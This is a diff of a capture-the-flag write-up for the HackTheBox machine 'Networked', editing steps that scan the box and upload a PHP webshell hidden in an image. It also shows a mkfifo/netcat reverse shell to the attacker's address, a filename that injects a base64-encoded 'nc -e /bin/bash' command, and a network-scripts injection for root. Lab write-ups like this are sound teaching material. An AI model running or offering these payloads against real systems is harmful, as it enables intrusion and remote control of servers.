@@ -11,8 +11,11 @@
 ### Nmap
 
 ```bash
-nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.146
-nmap -p 80,22,443 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.146
+nmap -p- --min-rate 10000 -oA networked-alltcp 10.10.10.146
+```
+
+```bash
+nmap -p 80,22,443 -sC -sV -oA networked-tcpscripts 10.10.10.146
 ```
 
 - **Ports open**:
@@ -57,10 +60,12 @@ AddHandler php5-script .php
 
 ### 🐚 Create Malicious File
 
-Append PHP to an image:
+Download Image
+Named the Image as shell.png
+
+#### Append cmd to image
 ```bash
-echo "<?php system(\$_GET['cmd']); ?>" >> shell.png
-mv shell.png shell.php.png
+echo "<?php system(\$_GET['cmd']); ?>" >> shell.php.png
 ```
 
 ### 🐱 Upload Webshell
@@ -74,12 +79,12 @@ http://10.10.10.146/upload.php
 
 Start listener:
 ```bash
-nc -lnvp 443
+nc -lnvp 6969
 ```
 
 Trigger reverse shell:
-```
-http://10.10.10.146/uploads/10_10_14_5.php.png?cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.7 443 >/tmp/f
+```bash
+http://10.10.10.146/uploads/eye.php.jpeg?cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.13 6969 >/tmp/f
 ```
 
 Shell as:
@@ -101,10 +106,10 @@ exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
 
 Exploit with a filename:
 ```bash
-touch "/var/www/html/uploads/a; echo bmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjE0LjcgNDQzCg== | base64 -d | sh; b"
+touch '/var/www/html/uploads/a; echo bmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjE0LjEzIDU4NTgK | base64 -d | sh; b'
 ```
 
-(Decoded: `nc -e /bin/bash 10.10.14.7 443`)
+(Decoded: `nc -e /bin/bash 10.10.14.13 5858`)
 
 ### 🧠 Wait for Cron
 
@@ -158,6 +163,8 @@ PROXY_METHOD: a /bin/bash
 BROWSER_ONLY: b
 BOOTPROTO: c
 ```
+
+`n bash` works for all also
 
 Root shell:
 ```bash
